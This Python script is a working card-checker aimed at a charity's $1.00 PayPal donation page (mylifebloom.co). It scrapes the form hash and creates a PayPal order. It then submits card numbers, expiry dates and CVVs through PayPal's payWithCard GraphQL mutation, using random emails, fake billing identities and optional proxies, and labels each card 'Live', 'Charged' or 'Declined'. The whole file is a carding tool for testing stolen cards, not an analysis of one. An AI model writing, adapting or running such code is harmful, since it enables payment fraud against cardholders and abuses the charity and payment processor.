import aiohttp
import re
import json
import random
import string
import asyncio

def generate_email():
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=12))
    return f"{name}@{random.choice(domains)}"

def get_paypal_card_brand(cc):
    cc = str(cc).strip()
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')) or (len(cc) >= 2 and 22 <= int(cc[:2]) <= 27):
        return 'MASTER_CARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'DISCOVER'
    elif cc.startswith(('300', '301', '302', '303', '304', '305', '36', '38')):
        return 'DINERS_CLUB'
    elif len(cc) >= 4 and 3528 <= int(cc[:4]) <= 3589:
        return 'JCB'
    return 'VISA'

async def process_paypal_charge(cc, mm, yy, cvv, proxy_url=None):
    """
    Processes a card through the PayPal Commerce $1.00 donation endpoint (mylifebloom.co).
    Returns: (is_live, message, response_text, receipt_url, amount)
    """
    if proxy_url:
        proxy_url = proxy_url.strip()
        if not proxy_url.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy_url = f"http://{proxy_url}"

    if len(yy) == 2:
        yy = "20" + yy

    email = generate_email()
    card_brand = get_paypal_card_brand(cc)

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=8)

    async def make_request(session, method, url, **kwargs):
        try:
            if method.upper() == 'GET':
                return await session.get(url, **kwargs)
            else:
                return await session.post(url, **kwargs)
        except Exception:
            kwargs.pop('proxy', None)
            if method.upper() == 'GET':
                return await session.get(url, **kwargs)
            else:
                return await session.post(url, **kwargs)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Fetch form hash from target donation page
            headers_init = {
                'host': 'mylifebloom.co',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 Chrome/148.0.7778.178 Mobile Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }

            async with await make_request(session, 'GET', 'https://mylifebloom.co/donations/support-the-lifebloom-cause/', headers=headers_init, proxy=proxy_url) as r:
                html_text = await r.text()

            hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', html_text)
            if not hash_match:
                return False, "Failed to extract give-form-hash", "", None, "$1.00"
            form_hash = hash_match.group(1)

            # 2. Create PayPal Commerce Order
            files = aiohttp.FormData()
            files.add_field('give-honeypot', '')
            files.add_field('give-form-id-prefix', '264-1')
            files.add_field('give-form-id', '264')
            files.add_field('give-form-title', 'Support the LifeBloom Cause')
            files.add_field('give-current-url', 'https://mylifebloom.co/donations/support-the-lifebloom-cause/')
            files.add_field('give-form-url', 'https://mylifebloom.co/donations/support-the-lifebloom-cause/')
            files.add_field('give-form-minimum', '1.00')
            files.add_field('give-form-maximum', '100000.00')
            files.add_field('give-form-hash', form_hash)
            files.add_field('give-price-id', '0')
            files.add_field('give-recurring-logged-in-only', '')
            files.add_field('give-logged-in-only', '1')
            files.add_field('_give_is_donation_recurring', '0')
            files.add_field('give_recurring_donation_details', '{"give_recurring_option":"yes_donor"}')
            files.add_field('give-amount', '1.00')
            files.add_field('payment-mode', 'paypal-commerce')
            files.add_field('give_first', 'hsjsjs')
            files.add_field('give_last', 'jwjwhwhw')
            files.add_field('give_email', email)
            files.add_field('give_agree_to_terms', '1')
            files.add_field('give-gateway', 'paypal-commerce')

            headers_ajax = {
                'host': 'mylifebloom.co',
                'user-agent': headers_init['user-agent'],
                'origin': 'https://mylifebloom.co',
                'referer': 'https://mylifebloom.co/donations/support-the-lifebloom-cause/',
            }

            async with await make_request(session, 'POST', 'https://mylifebloom.co/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', headers=headers_ajax, data=files, proxy=proxy_url) as r:
                try:
                    resp_json = await r.json()
                    order_id = resp_json['data']['id']
                except Exception:
                    raw = await r.text()
                    return False, "Failed to create PayPal Order", raw, None, "$1.00"

            # 3. Setup PayPal Session GraphQL Requests
            headers_pp = {
                'host': 'www.paypal.com',
                'x-app-name': 'smart-payment-buttons',
                'paypal-client-context': '72N97200JN196742V',
                'user-agent': headers_init['user-agent'],
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/',
            }

            json_details = {
                'query': 'query GetCheckoutDetails($orderID: String!) { checkoutSession(token: $orderID) { cart { billingType productCode intent paymentId billingToken amounts { total { currencyValue currencyCode currencyFormatSymbolISOCurrency } } supplementary { initiationIntent } category } flags { isChangeShippingAddressAllowed } payees { merchantId email { stringValue } } } }',
                'variables': {'orderID': order_id},
            }
            await make_request(session, 'POST', 'https://www.paypal.com/graphql?GetCheckoutDetails', headers=headers_pp, json=json_details, proxy=proxy_url)

            json_config = {
                'query': 'mutation UpdateClientConfig($orderID: String!, $fundingSource: ButtonFundingSourceType!, $integrationArtifact: IntegrationArtifactType!, $userExperienceFlow: UserExperienceFlowType!, $productFlow: ProductFlowType, $buttonSessionID: String) { updateClientConfig(token: $orderID, fundingSource: $fundingSource, integrationArtifact: $integrationArtifact, userExperienceFlow: $userExperienceFlow, productFlow: $productFlow, buttonSessionID: $buttonSessionID) }',
                'variables': {
                    'orderID': order_id,
                    'fundingSource': 'card',
                    'integrationArtifact': 'PAYPAL_JS_SDK',
                    'userExperienceFlow': 'INLINE',
                    'productFlow': 'SMART_PAYMENT_BUTTONS',
                },
            }
            await make_request(session, 'POST', 'https://www.paypal.com/graphql?UpdateClientConfig', headers=headers_pp, json=json_config, proxy=proxy_url)

            # 4. Process Card Charge Mutation
            headers_card = {
                'host': 'www.paypal.com',
                'paypal-client-context': order_id,
                'x-app-name': 'standardcardfields',
                'paypal-client-metadata-id': '72N97200JN196742V',
                'user-agent': headers_init['user-agent'],
                'x-country': 'TR',
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://www.paypal.com',
                'referer': f'https://www.paypal.com/smart/card-fields?token={order_id}',
            }

            json_pay = {
                'query': 'mutation payWithCard($token: String!, $card: CardInput, $paymentToken: String, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $installmentTerm: Int, $identityDocument: IdentityDocumentInput, $feeReferenceId: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, paymentToken: $paymentToken, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, installmentTerm: $installmentTerm, identityDocument: $identityDocument, feeReferenceId: $feeReferenceId) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }',
                'variables': {
                    'token': order_id,
                    'card': {
                        'cardNumber': cc,
                        'type': card_brand,
                        'expirationDate': f'{mm}/{yy}',
                        'postalCode': '10001',
                        'securityCode': cvv,
                    },
                    'phoneNumber': '5356431233',
                    'firstName': 'James',
                    'lastName': 'Smith',
                    'billingAddress': {
                        'givenName': 'James',
                        'familyName': 'Smith',
                        'line1': '123 Main Street',
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': '10001',
                        'country': 'US',
                    },
                    'shippingAddress': {
                        'givenName': 'James',
                        'familyName': 'Smith',
                        'line1': '123 Main Street',
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': '10001',
                        'country': 'US',
                    },
                    'email': email,
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': 'payWithCard',
            }

            async with await make_request(session, 'POST', 'https://www.paypal.com/graphql?paywithcard', headers=headers_card, json=json_pay, proxy=proxy_url) as r:
                try:
                    response3 = await r.json()
                except Exception:
                    raw = await r.text()
                    return False, "JSON Parse Error on PayPal Charge", raw, None, "$1.00"

            lives = [
                "INVALID_SECURITY_CODE",
                "INVALID_BILLING_ADDRESS",
                "EXISTING_ACCOUNT_RESTRICTED",
                "is3DSecureRequired",
            ]

            cash = "Unknown Response"

            if "errors" in response3 and response3["errors"]:
                error_msg = response3["errors"][0]
                if "data" in error_msg and error_msg["data"]:
                    if isinstance(error_msg["data"], list) and len(error_msg["data"]) > 0:
                        cash = error_msg["data"][0].get("code", "Unknown error")
                    elif isinstance(error_msg["data"], dict):
                        code = error_msg["data"].get("error", "")
                        cash = code if code else error_msg.get("message", "Unknown error")
                    else:
                        cash = error_msg.get("message", "Unknown error")
                else:
                    cash = error_msg.get("message", "Unknown error")

            elif response3.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                approve_data = response3["data"]["approveGuestPaymentWithCreditCard"]
                flags = approve_data.get("flags", {})
                if flags.get("is3DSecureRequired"):
                    cash = "is3DSecureRequired"
                else:
                    cash = "Approved!"

            is_live = False
            if any(live_code in cash for live_code in lives):
                status_res = f"Live ({cash})"
                is_live = True
            elif "Approved" in cash:
                status_res = "Charged ($1.00)"
                is_live = True
            elif "INVALID_RESOURCE_ID" in cash:
                status_res = "Retry (Invalid Token)"
            elif "GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED" in cash:
                status_res = "Integrity Validation Failed / Risk Block"
            else:
                status_res = f"Declined ({cash})"

            return is_live, status_res, json.dumps(response3), None, "$1.00"

    except Exception as e:
        return False, f"Exception: {str(e)}", "", None, "$1.00"
